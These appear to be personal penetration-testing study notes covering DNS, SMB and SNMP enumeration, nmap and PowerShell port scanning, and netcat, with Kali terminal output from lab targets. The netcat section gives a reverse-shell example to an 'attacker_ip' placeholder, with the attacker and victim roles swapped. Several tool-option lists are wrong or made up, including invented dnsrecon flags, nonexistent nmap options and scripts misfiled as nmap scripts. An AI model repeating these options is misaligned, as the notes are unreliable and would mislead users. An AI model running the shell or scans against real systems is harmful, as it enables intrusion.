### **DNS**
[53 - Pentesting DNS - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns)
make sure you put the www in the website. see example below
┌──(hollacosta㉿kali1)-[~]
└─$ host megacorpcone.com
Host megacorpcone.com not found: 3(NXDOMAIN)

┌──(hollacosta㉿kali1)-[~]
└─$ host www.megacorpone.com                                             1 ⨯
www.megacorpone.com has address 149.56.244.87

Create a list of the possible hostnames
└─$ cat list.txt 
1. www
2. mail
3. ftp
4. admin
5. test
6. vpn
7. portal
8. exchange
9. router
10. api
11. webmail
12. database
13. git
14. login
15. ssh
16. backup
17. proxy
18. remote
19. monitoring
20. cloud

└─**$ for ip in $(cat list.txt); do host $ip.megacorpone.com; done**  ---automate host f
www.megacorpone.com has address 149.56.244.87
Host ftp.megacorpone.com not found: 3(NXDOMAIN)
mail.megacorpone.com has address 51.222.169.212
Host owa.megacorpone.com not found: 3(NXDOMAIN)
Host proxy.megacorpone.com not found: 3(NXDOMAIN)
router.megacorpone.com has address 51.222.169.214

USING GREP TO JUST IDENTIFY THE ONES THAT ARE GOOD
└─$ for ip in $(cat list.txt); do host $ip.megacorpone.com; done | grep "has address"                                                                   1 ⨯
www.megacorpone.com has address 149.56.244.87
mail.megacorpone.com has address 51.222.169.212
admin.megacorpone.com has address 51.222.169.208
test.megacorpone.com has address 51.222.169.219
vpn.megacorpone.com has address 51.222.169.220
router.megacorpone.com has address 51.222.169.214

**SCAN AN IP RANGE AND USE THE GREP -V TO EXCLUDE THE NOT FOUND RESULTS**

for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
the ip bash loops in the ips 200-254 and is placed with the $

### **DNS RECON** -end parameter (std) is standard scan
the strongest parameters you can consider using: ^c034b3

1. **-d (Domain)**: Specify the target domain name to perform DNS reconnaissance on.
2. **-t (Type)**: Choose the type of DNS enumeration you want to perform. Common options include standard (A, AAAA, MX, NS, SOA, TXT, SRV), reverse (PTR), brute force (bruteforce), and more.
3. **-D (Dictionary File)**: Provide a custom wordlist or dictionary file for DNS brute forcing. A strong wordlist can significantly impact the effectiveness of brute force enumeration.
4. **-r (Range)**: Define a specific IP address range to scan for reverse DNS lookups.
5. **-c (Concurrency)**: Set the number of concurrent DNS queries to perform, which can speed up the enumeration process.
6. **-p (Port)**: Specify the DNS server port to query. The default is 53, but some DNS servers may use non-standard ports.
7. **-T (Thread Count)**: Configure the number of threads to use for DNS queries. Increasing this value can help speed up the enumeration process but be cautious not to overload DNS servers.
8. **-e (Exit After)**: Set a time limit (in seconds) for how long DNSRecon should continue its enumeration before exiting. 
9. **-j (JSON Output)**: Save the results in JSON format for easier parsing and analysis. 
10. **-z (Brute Force Reverse Lookup)**: Enable brute-force reverse DNS lookups, which can reveal additional hostnames associated with IP addresses.  
11. **-P (Permutations)**: Generate permutations of the domain name to discover potential subdomains.
12. **-D (DNS Servers)**: Specify a list of DNS servers to use for querying. This can help you test different DNS servers for the same domain.
13. **-w (Write to File)**: Save the results to a text file for later analysis.
14. **-f (Full Results)**: Display full results, including records with empty fields. 
15. **-R (Recurse)**: Recursively enumerate subdomains, allowing for deeper exploration    
16. **-n (No Recursion)**: Disable recursive querying to avoid hitting authoritative DNS servers.  
17. **-C (Cache Snooping)**: Attempt to retrieve cached DNS records from the target server.
    
18. **-A (All)**: Combine multiple types of enumeration (e.g., standard, reverse, brute force) in a single scan. ^f307d3

### **DNSENUM**

- `-w`: Specify a custom wordlist for subdomain enumeration.
- `-l`: Set the maximum length of brute force subdomains.
- `-L`: Provide a list of characters to use for brute forcing.
- `-f`: Fetch additional information about discovered subdomains.
- `-r`: Perform reverse DNS lookups on IP addresses.
- `-n`: Use a specific DNS server for enumeration.
- `-o`: Save results to a file.
- `-t`: Specify the number of threads for faster enumeration.
- `-p`: Format the output for easier reading.
- `-g`: Use Google dorks for subdomain enumeration.
- `-i`: Attempt to gather additional information about subdomains.
- `-r`: Perform recursive subdomain enumeration.

### **NETCAT**
1. **Basic Network Scanning:**
    - `-v` (Verbose): Provides detailed information about the connection.
    - `-n` (Numeric-only IP addresses): Prevents DNS resolution for faster scans.
    - `-z` (Zero-I/O mode): Checks if a port is open without sending any data.
    - `-w` (Timeout): Sets a timeout for connection attempts.
2. **Port Scanning:**
    - `-z` (Zero-I/O mode): Use it for quick port scanning.
    - `-v` (Verbose): Provides more detailed output.
3. **Banner Grabbing:**
    - Connect to a service and observe the banner to identify the service version.
4. **File Transfer:**
    - Use `nc` in combination with pipes (`|`) to transfer files between systems.
    - Example: `nc -l -p 12345 < file_to_send` on one system and `nc destination_ip 12345 > received_file` on another.
5. **Reverse Shell:**
    - Create a reverse shell to gain access to a remote system.
    - On the attacker machine: `nc -l -p 12345 -e /bin/bash`
    - On the victim machine: `nc attacker_ip 12345`
6. **Listening Mode:*
    - `-l` (Listen mode): Used for listening on a specific port.
    - `-p` (Port): Specify the port to listen on.
7. **UDP Mode:**
    - `-u` (UDP mode): Use for UDP connections instead of TCP.
8. **Source Port Spoofing:**
    - `-s` (Source port): Spoof the source port for evasion purposes.
9. **Timeouts:**
    - `-w` (Timeout): Set a timeout for connections.
    - `-z` (Zero-I/O mode): Use in combination with a timeout to quickly check if a port is open.
10. **Verbose Output:**
    - `-v` (Verbose): Provides detailed information about the connection.
11. **Listening on All Interfaces:**
    - `-k` (Keep listening): Forces `nc` to keep listening for incoming connections even after one connection is closed.
    - `-s` (Bind source address): Specify a source IP address to listen on a specific network interface.
12. **Firewall Evasion:**
    - Use options like `-e` to specify an executable to run upon connection, which can help bypass firewalls and intrusion detection systems.
    -
### NSLOOKUP (WINDOWS)

[10 most used Nslookup commands (github.com)](https://gist.github.com/eguyd/b87528d0863bd59c0907e9cdc708b38e)

C:\Users\17542>nslookup -type=mx google.com
Server:  G3100.myfiosgateway.com
Address:  192.168.1.1

Non-authoritative answer:
google.com      MX preference = 10, mail exchanger = smtp.google.com

smtp.google.com internet address = 142.251.167.26
smtp.google.com internet address = 142.251.167.27
smtp.google.com internet address = 172.253.62.27
smtp.google.com internet address = 172.253.62.26
smtp.google.com internet address = 172.253.115.26
smtp.google.com AAAA IPv6 address = 2607:f8b0:4004:c1d::1a
smtp.google.com AAAA IPv6 address = 2607:f8b0:4004:c1d::1b
smtp.google.com AAAA IPv6 address = 2607:f8b0:4004:c07::1b
smtp.google.com AAAA IPv6 address = 2607:f8b0:4004:c07::1a

### ***NMAP PORT SCANNING***
[Nmap Summary (ESP) - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/nmap-summary-esp)
[Nmap Cheat Sheet 2023: All the Commands, Flags & Switches (stationx.net)](https://www.stationx.net/nmap-cheat-sheet/)

To see the traffic of all the action that you are doing, set up iptables
https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/suricata-and-iptables-cheatsheet#iptables

 **NMAP**
└─$ sudo nmap -sS 192.168.234.52                                                                        ---- STEALTH SCAN ^002524

└─$ sudo nmap -sT 192.168.234.52
Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-25 06:57 EDT      ---- TCP FULL CONNECT SCAN

┌──(hollacosta㉿kali1)-[~]
└─$ sudo nmap -sU 192.168.234.52                                                                               ---- UDP SCAN

1. **Basic Scan Types:**
    - `-sS` (TCP SYN Scan): Stealthy scan that sends SYN packets to determine open ports.
    - `-sT` (TCP Connect Scan): Completes the TCP three-way handshake to determine open ports.
    - `-sU` (UDP Scan): Scans for open UDP ports.
    - `-sV` (Service Version Detection): Attempts to determine the version of services running on open ports.
2. **Timing Options:**
    - `-T` (Timing Template): Adjusts scan speed and aggressiveness (e.g., `-T4` for aggressive).
    - `--max-rtt-timeout` and `--max-retries`: Fine-tune timing settings.
3. **Output Options:**
    - `-oA` (Output to All Formats): Generates output in multiple formats (grepable, XML, and normal).
    - `-oN` (Normal Output): Outputs results in a human-readable format.
    - `-oX` (XML Output): Useful for parsing results with other tools.
4. **Host Discovery:**
    - `-sn` (Ping Scan): Quickly identifies live hosts using ICMP echo requests.
    - `-Pn` (No Ping): Skips host discovery and assumes all hosts are up.
5. **Scripting Engine:**
    - `--script` (Nmap Scripting Engine): Run custom NSE scripts for additional vulnerability scanning or information gathering.
6. **Port Specification:**
    - `-p` (Port Range): Specify the ports to scan (e.g., `-p 1-1000`).
7. **OS Detection:**
    - `-O` (OS Detection): Attempts to identify the operating system of target hosts.
8. **Aggressive Scanning:**
    - `-A` (Aggressive Scan): Combines various scan options (service version detection, OS detection, and more).
9. **Firewall and IDS Evasion:**
    - `--fuzzy` (Fuzzy Scan): Helps bypass some packet filtering devices.
    - `--data-length` and `--ip-options`: Customize packet headers to evade filters.
10. **Output Analysis:**
    - `--script-args` (Script Arguments): Customize NSE script behavior.
    - `--script-updatedb` (Update NSE scripts): Keep NSE scripts up to date.
11. **IPv6 Scanning:**
    - `-6` (IPv6 Scan): Perform scans on IPv6 networks.
12. **Timing and Rate Control:**
    - `--min-rate` and `--max-rate`: Control the scan rate.
    - `--max-scan-delay` and `--max-retries`: Adjust timeouts and retries.
13. **Aggressive Timing:**
    - `-T4` or `-T5`: Use aggressive timing templates when speed is crucial (be cautious not to overwhelm the network).
14. **Output Format Selection:**
    - `--open` and `--output-format`: Filter and format output based on open ports.

**NMAP SCRIPTS**
1. **Vulnerability Scanning:**
    - `vulners`: This script checks for known vulnerabilities in services and software on the target system by querying the Vulners database.
2. **Service Enumeration:** 
    - `enum4linux`: This script is used for gathering information about Windows systems, including shares, users, and more.
    - `http-enum`: It enumerates directories and files on web servers, helping you find hidden content.
    - `smtp-enum-users`: This script tries to enumerate valid email addresses on a mail server.
3. **Exploitation and Brute Force:**    
    - `smb-vuln*`: These scripts check for specific SMB (Server Message Block) vulnerabilities.
    - `ftp-brute`: It performs brute-force attacks against FTP servers.
    - `ssh-brute`: This script brute forces SSH login credentials.
4. **SSL/TLS Vulnerabilities:**
    - `ssl-heartbleed`: Checks for the Heartbleed vulnerability in SSL/TLS implementations.
    - `ssl-poodle`: Identifies SSLv3 vulnerabilities like the POODLE attack.
5. **Database Scanning:**
    - `mysql-*`, `ms-sql-*`, `mongodb-*`: These scripts are used to enumerate and gather information about various database services.
6. **Information Gathering:**
    - `dns-zone-transfer`: Attempts to perform a DNS zone transfer, which can reveal internal domain information.
    - `snmp-brute`: Brute forces SNMP (Simple Network Management Protocol) community strings.
    - `sip-brute`: Brute forces SIP (Session Initiation Protocol) credentials.
7. **Firewall and IDS Evasion:**
    - `ftp-bounce`: Checks if the FTP server allows PORT or PASV command bounce attacks.
    - `http-shellshock`: Detects the Shellshock vulnerability in HTTP servers.
    - `scanme.nse`: It scans the target with a variety of common scan techniques to check how well it detects and responds to scans.
    
┌──(hollacosta㉿kali1)-[~]
└─$ sudo nmap -p 80 192.168.234.1-253 -oG web-sweep.txt                     ---- WEB SWEEP ON PORT
[sudo] password for hollacosta: 
Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-25 07:39 EDT
Nmap scan report for 192.168.234.52
Host is up (0.030s latency).

PORT   STATE  SERVICE
80/tcp closed http

Nmap done: 253 IP addresses (1 host up) scanned in 36.66 seconds
┌──(hollacosta㉿kali1)-[~]
└─$ grep open web-sweep.txt| cut -d " " -f2                                -----
┌──(hollacosta㉿kali1)-[~]
└─$ cat web-sweep.txt             

Host: 192.168.234.52 () Status: Up
Host: 192.168.234.52 () Ports: 80/closed/tcp//http///

┌──(hollacosta㉿kali1)-[~]
└─$ nmap -v -sn 192.168.234.1-253 -oG ping-sweep.txt                                   ---- NETWORK SWEEP
Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-25 07:45 EDT
Initiating Ping Scan at 07:45
Scanning 253 hosts [2 ports/host]
Completed Ping Scan at 07:45, 7.29s elapsed (253 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:45
Completed Parallel DNS resolution of 1 host. at 07:45, 0.01s elapsed


┌──(hollacosta㉿kali1)-[/usr/share/nmap]
└─$ sudo nmap -O 192.168.234.52 --osscan-guess         
[sudo] password for hollacosta: 

┌──(hollacosta㉿kali1)-[/usr/share/nmap]
└─$ nmap -sT -A 192.168.234.52         

**PORT SCANNING SMB VIA POWERSHELL**
Test-NetConnection -Port 445 192.168.50.151

**AUTOMATING A POWERSHELL PORTSCANNING**
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.248.52", $_)) "TCP port $_ is open"} 2>$null

### [Basic PowerShell for Pentesters - HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)




**SMB ENUMERATION**
[139,445 - Pentesting SMB - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
**NBTSCAN**
└─$ sudo nbtscan -r 192.168.234.20/24                              
Doing NBT name scan for addresses from 192.168.234.20/24

**NBTSTAT** - on Windows



### SMB/NETBIOS 

[139,445 - Pentesting SMB - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

nmap -v -p 139,445 -oG smb.txt 192.168.234.      
- `-v`: It makes the tool provide more details during the scan.
- `-p 139,445`: It checks if ports 139 and 445 are open on a device. These ports are often used for file sharing on Windows computers.
- `-oG smb.txt`: The results of the scan will be saved in a file named "smb.txt."
- `192.168.234`: This is the address of the device you want to scan (it should be complete, as the provided address ends with a dot).

┌──(hollacosta㉿kali1)-[~]                                              ---- TO FIND ALL THE SMBs listed
└─$ ls -l /usr/share/nmap/scripts/smb*
-rw-r--r-- 1 root root  3355 Oct 12  2020 /usr/share/nmap/scripts/smb2-capabilities.nse
-rw-r--r-- 1 root root  3075 Oct 12  2020 /usr/share/nmap/scripts/smb2-security-mode.nse

### **SMTP** - MAIL TRANSFER PROTOCOL
[25,465,587 - Pentesting SMTP/s - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)

### **SNMP**  NETWORK MANAGEMENT PROTOCOL
[161,162,10161,10162/udp - Pentesting SNMP - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
1. **System Information (SNMPv2-MIB::sysDescr):**
    - OID: 1.3.6.1.2.1.1.1.0
    - Command: `snmpwalk -v2c -c public <target_IP> SNMPv2-MIB::sysDescr`
2. **System Name (SNMPv2-MIB::sysName):**
    - OID: 1.3.6.1.2.1.1.5.0
    - Command: `snmpwalk -v2c -c public <target_IP> SNMPv2-MIB::sysName`
3. **Network Interfaces (IF-MIB::ifDescr):**
    - OID: 1.3.6.1.2.1.2.2.1.2
    - Command: `snmpwalk -v2c -c public <target_IP> IF-MIB::ifDescr`
4. **Running Processes (HOST-RESOURCES-MIB::hrSWRunName):**
    - OID: 1.3.6.1.2.1.25.4.2.1.2
    - Command: `snmpwalk -v2c -c public <target_IP> HOST-RESOURCES-MIB::hrSWRunName`
5. **Listening Ports (TCP-MIB::tcpConnLocalAddress and TCP-MIB::tcpConnLocalPort):**
    - OIDs:
        - Local Address: 1.3.6.1.2.1.6.19.1.2
        - Local Port: 1.3.6.1.2.1.6.19.1.3
    - Command (for local address): `snmpwalk -v2c -c public <target_IP> TCP-MIB::tcpConnLocalAddress`
    - Command (for local port): `snmpwalk -v2c -c public <target_IP> TCP-MIB::tcpConnLocalPort`
6. **Routing Table (IP-MIB::ipRouteDest and IP-MIB::ipRouteNextHop):**
    - OIDs:
        - Destination: 1.3.6.1.2.1.4.21.1.1
        - Next Hop: 1.3.6.1.2.1.4.21.1.7
    - Command (for destination): `snmpwalk -v2c -c public <target_IP> IP-MIB::ipRouteDest`
    - Command (for next hop): `snmpwalk -v2c -c public <target_IP> IP-MIB::ipRouteNextHop`
7. **System Uptime (DISMAN-EVENT-MIB::sysUpTimeInstance):**
    - OID: 1.3.6.1.2.1.1.3.0
    - Command: `snmpwalk -v2c -c public <target_IP> DISMAN-EVENT-MIB::sysUpTimeInstance`


|OID|Description|
|---|---|
|1.3.6.1.2.1.1.1.0|System Description (sysDescr)|
|1.3.6.1.2.1.1.2.0|System Object ID (sysObjectID)|
|1.3.6.1.2.1.1.5.0|System Name (sysName)|
|1.3.6.1.2.1.1.6.0|System Location (sysLocation)|
|1.3.6.1.2.1.1.4.0|System Contact (sysContact)|
|1.3.6.1.2.1.1.7.0|System Services (sysServices)|
|1.3.6.1.2.1.2.2.1.2|Interface Description (ifDescr)|
|1.3.6.1.2.1.2.2.1.3|Interface Type (ifType)|
|1.3.6.1.2.1.2.2.1.5|Interface Speed (ifSpeed)|
|1.3.6.1.2.1.2.2.1.6|Interface Physical Address (ifPhysAddress)|
|1.3.6.1.2.1.2.2.1.7|Interface Admin Status (ifAdminStatus)|
|1.3.6.1.2.1.2.2.1.8|Interface Oper Status (ifOperStatus)|
|1.3.6.1.2.1.2.2.1.9|Interface Last Change (ifLastChange)|
|1.3.6.1.2.1.2.2.1.10|Interface In Octets (ifInOctets)|
|1.3.6.1.2.1.2.2.1.11|Interface In Ucast Packets (ifInUcastPkts)|
|1.3.6.1.2.1.2.2.1.12|Interface In Errors (ifInErrors)|
|1.3.6.1.2.1.2.2.1.13|Interface In Discards (ifInDiscards)|
|1.3.6.1.2.1.2.2.1.14|Interface In Unknown Protos (ifInUnknownProtos)|
|1.3.6.1.2.1.2.2.1.15|Interface Out Octets (ifOutOctets)|
|1.3.6.1.2.1.2.2.1.16|Interface Out Ucast Packets (ifOutUcastPkts)|
|1.3.6.1.2.1.2.2.1.17|Interface Out Errors (ifOutErrors)|
|1.3.6.1.2.1.2.2.1.18|Interface Out Discards (ifOutDiscards)|
|1.3.6.1.2.1.2.2.1.19|Interface Out Queue Length (ifOutQLen)|
|1.3.6.1.2.1.25.2.3.1.5|Storage Name (hrStorageDescr)|
|1.3.6.1.2.1.25.2.3.1.6|Storage Type (hrStorageType)|
|1.3.6.1.2.1.25.2.3.1.7|Storage Allocation Units (hrStorageAllocationUnits)|
|1.3.6.1.2.1.25.2.3.1.8|Storage Size (hrStorageSize)|
|1.3.6.1.2.1.25.2.3.1.9|Storage Used (hrStorageUsed)|
|1.3.6.1.2.1.25.2.3.1.10|Storage Allocation Failures (hrStorageAllocationFailures)|
|1.3.6.1.2.1.25.1.6.0|System Uptime (sysUp|

|   |   |
|---|---|
|1.3.6.1.2.1.25.1.6.0|System Processes|
|1.3.6.1.2.1.25.4.2.1.2|Running Programs|
|1.3.6.1.2.1.25.4.2.1.4|Processes Path|
|1.3.6.1.2.1.25.2.3.1.4|Storage Units|
|1.3.6.1.2.1.25.6.3.1.2|Software Name|
|1.3.6.1.4.1.77.1.2.25|User Accounts|
|1.3.6.1.2.1.6.13.1.3|TCP Local Ports|

**FINDINDG SNMP WITH NMAP AND BUILDING COMMUNITY STRINGS USING ONESIXTYONE**

kali@kali:~$ sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
kali@kali:~$ echo public > community
kali@kali:~$ echo private >> community
kali@kali:~$ echo manager >> community

for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
kali@kali:~$ onesixtyone -c community -i 
public -v1 -t 10 192.168.50.151


